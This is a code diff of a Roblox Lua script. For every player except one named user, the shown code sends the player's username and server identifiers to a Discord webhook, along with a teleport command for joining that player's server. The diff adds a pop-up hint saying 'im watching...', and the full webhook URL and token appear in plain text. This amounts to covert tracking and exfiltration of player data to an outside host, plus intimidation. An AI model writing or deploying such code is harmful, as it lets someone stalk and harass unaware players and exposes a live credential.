@@ -11,8 +11,10 @@ if game.Players.LocalPlayer.Name ~= "Sammywammylol502" then
             username = game.Players.LocalPlayer.Name,
             content = 'JobId = `'..game.JobId..'`\nPlaceId = `'..game.PlaceId..'`\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance('..game.PlaceId..', "'..game.JobId..'", game.Players.LocalPlayer)```'
         })
-    })
-    task.wait(15)
+    })local hint
+	task.delay(15,function()hint=Instance.new('Hint',workspace)hint.Text='im watching...'end)
+    task.wait(25)
+	 hint:Destroy()
 	request({
         Url = "https://discordapp.com/api/webhooks/1506162347054727261/sLurO4YZGRxs5jSWKKmT2noinC89lb-AdmVpPBXrCxxY9QWkwmXJo0H7TtRbV-cL-LpX",
         Method = "POST",
